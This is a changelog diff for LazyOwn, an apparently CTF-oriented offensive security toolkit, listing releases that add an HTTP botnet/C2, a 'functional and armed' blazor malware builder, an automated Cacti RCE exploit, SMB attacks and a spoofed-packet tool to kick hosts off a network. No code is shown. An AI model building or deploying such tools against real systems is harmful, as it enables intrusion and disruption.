+  *   * feature(feat): nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.33 \n\n sherlock, trufflehog, weevelygen, weevely \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 03:07:45 2024 -0400 \n\n Hora: 1725001665
+
+
+### Correcciones urgentes
+
+### Otros
+
+  *   * hotfix(hotfix): deleted the insecure chat \n\n Version: release/0.1.32 \n\n DELETED \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 30 02:58:04 2024 -0400 \n\n Hora: 1725001084
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.31 \n\n parsero, nueclei, dmitry, msfrpc, graudit, cewl, sslscan \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - external/install_external.sh - lazyown - sessions/download_resources.sh - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 28 23:02:18 2024 -0400 \n\n Hora: 1724900538
+
+
+### Otros
+
+### Otros
+
+  *   * feature(feat): Nuevos comandos documentados en COMMANDS.md \n\n Version: release/0.1.30 \n\n sqli, sshkey, crunch, malwarebazar, download_malwarebazar, and an easteregg :) \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 02:47:43 2024 -0400 \n\n Hora: 1724741263
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): some fixes in c2 \n\n Version: release/0.1.29 \n\n now curl attack \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 01:53:40 2024 -0400 \n\n Hora: 1724738020
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(kick): to kick from net some ip \n\n Version: release/0.1.28 \n\n seend spoofed packet to kick some ip from our net \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 27 00:53:52 2024 -0400 \n\n Hora: 1724734432
+
+
+### Otros
+
+### Otros
+
+  *   * feature(new command c2 documentad at COMMANDS.md): a little botnet over http :) \n\n Version: release/0.1.27 \n\n this is my second aproach the first is a little botnet using sockets, the new it's web :) \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 26 03:07:21 2024 -0400 \n\n Hora: 1724656041
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix auto exploit cacti rce logged): now the attack work automated \n\n Version: release/0.1.26 \n\n smoothy \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Mon Aug 26 02:18:44 2024 -0400 \n\n Hora: 1724653124
+
+
+### Otros
+
+### Otros
+
+  *   * feature(new commands docummented at COMMANDS.md): waybackmachine, morse, powerserver, shellshock, wifipass, ngrok and smalldic \n\n Version: release/0.1.25 \n\n with love by grisun0 \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - modules/headers.json - modules/lazyseo.py - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 23:28:31 2024 -0400 \n\n Hora: 1724556511
+
+
+### Otros
+
+### Otros
+
+  *   * feature(2 new attacks): docummented at COMMANDS.md \n\n Version: release/0.1.24 \n\n smbattack and cacti_exploit \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 15:22:18 2024 -0400 \n\n Hora: 1724527338
+
+
+### Pruebas
+
+### Otros
+
+  *   * test(new machine): monitorsthree.htb \n\n Version: release/0.1.23 \n\n happyhacking \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - payload.json\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 03:15:09 2024 -0400 \n\n Hora: 1724483709
+
+
+### Refactorización
+
+### Otros
+
+  *   * refactor(new payload): in msfvenom \n\n Version: release/0.1.23 \n\n :) java jsp :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 01:45:02 2024 -0400 \n\n Hora: 1724478302
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(new feature): padbuster \n\n Version: release/0.1.23 \n\n new command padbuster documented at COMMANDS.md \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 00:11:22 2024 -0400 \n\n Hora: 1724472682
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(documentacion): nueva versiòn en la web reflejada en el banner \n\n Version: release/0.1.22 \n\n :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Sat Aug 24 00:03:47 2024 -0400 \n\n Hora: 1724472227
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(new documentation): better documentation to commands and utils \n\n Version: release/0.1.22 \n\n :) \n\n Modified file(s):\n- COMMANDS.md - README.md - UTILS.md - docs/COMMANDS.html - docs/README.html - docs/UTILS.html - docs/index.html - docs/index.html.bak - lazyown - utils.py\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 23:30:32 2024 -0400 \n\n Hora: 1724470232
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(new feat in createdll): new option 3 to run automate create dll blazor malware \n\n Version: release/0.1.22 \n\n this attack its in 2 faces, first run lazymsfvenom or venom, crate shell.elf and you can cratedll option 3 :) \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/lin/blazormalware.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 23:13:14 2024 -0400 \n\n Hora: 1724469194
+
+
+### Correcciones
+
+### Otros
+
+  *   * fix(fix): blazormalware corrected now functional and armed :) \n\n Version: release/0.1.21 \n\n and lanter machine was pwned :P \n\n Modified file(s):\n- README.md - docs/README.html - docs/index.html - docs/index.html.bak - sessions/lin/blazormalware.sh - sessions/win/lazycat.ps1 - sessions/win/rev.c\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Fri Aug 23 15:28:03 2024 -0400 \n\n Hora: 1724441283
+
+
+### Documentación
+
+### Otros
+
+  *   * docs(Lang): Translate README.md to English, enhancing clarity and structure for better understanding of the project features and usage. \n\n Version: release/0.1.20 \n\n This commit translates the README.md file into English to make it accessible to a wider audience. The translation maintains the original content's intent while improving clarity and coherence. Additionally, I've structured the document to highlight key features, usage instructions, acknowledgments, and licensing information. This update aims to enhance the overall understanding of the LazyOwn project and its functionalities. \n\n Modified file(s):\n- COMMANDS.md - README.md - docs/COMMANDS.html - docs/README.html - docs/index.html - docs/index.html.bak - lazyown\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Wed Aug 21 02:25:41 2024 -0400 \n\n Hora: 1724221541
+
+
+### Nuevas características
+
+### Otros
+
+  *   * feat(malware new): blazor malware \n\n Version: release/0.1.20 \n\n create blazormalware.sh \n\n Modified file(s):\n- DEPLOY.sh - README.md - docs/README.html - docs/index.html - docs/index.html.bak - lazyown - sessions/download_resources.sh\n  LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429 \n\n  LazyOwn/   https://grisuno.github.io/LazyOwn/ \n\n \n\n Fecha: Tue Aug 20 03:17:47 2024 -0400 \n\n Hora: 1724138267
 
 
 ### Refactorización
